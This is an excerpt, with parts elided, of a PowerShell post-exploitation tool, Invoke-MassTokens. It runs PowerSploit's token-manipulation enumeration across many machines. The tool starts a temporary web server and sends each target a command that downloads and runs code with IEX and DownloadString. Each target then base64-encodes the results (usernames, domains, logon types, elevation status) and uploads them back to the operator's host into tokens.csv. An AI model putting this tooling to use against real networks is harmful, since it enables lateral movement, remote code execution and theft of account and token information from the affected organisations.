function Invoke-MassTokens {
    <#
        .SYNOPSIS
        Runs PowerSploit's Invoke-TokenManiupulation across multiple 
        machines by throwing up a temporary web server and using WMI 
        ...
        .PARAMETER Hosts
        Array of host names to run Invoke-MassTokens on,
        passable on the pipeline.

        .PARAMETER HostList
        List of host names to run Invoke-MassTokens on.
        ...
        File to pipe host outputs to. Defaults to 'tokens.csv'.
...
'@
            ...
            while ($Hso.IsListening) {
                ...
                # process any POST results from the invoked script
                    ...
                    if (($output) -and ($output.Length -ne 0)) {
                        ...
                        $decoded | Out-File -Append -Encoding ASCII -FilePath $OutputFile
                    }
                }
        ...
        if (-not (Split-Path $OutputFile -IsAbsolute)) {
            $OutputFile = join-path $pwd $OutputFile
            Write-Verbose "OutputFile: $OutputFile"
        }

        # set up the output .csv header
        "Hostname,Domain,Username,ProcessID,LogonType,IsElevated,TokenType" | Out-File -Encoding ASCII -FilePath $OutputFile

        Start-Job -Name WebServer -Scriptblock $WebserverScriptblock -ArgumentList $LocalPort, $OutputFile | Out-Null
    ...
    process {
        ...
        $hosts | % {
            ...
            $command = "IEX (New-Object Net.Webclient).DownloadString('http://" + $LocalIpAddress + ":$LocalPort/update') | Select-Object @{Name='Hostname';Expression={'$_'}},Domain,Username,ProcessId,LogonType,IsElevated,TokenType | ConvertTo-Csv | select -skip 2 | % {[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$_))} | % {(new-object net.webclient).UploadString('http://" + $LocalIpAddress + ":$LocalPort/$_', `$_)}"
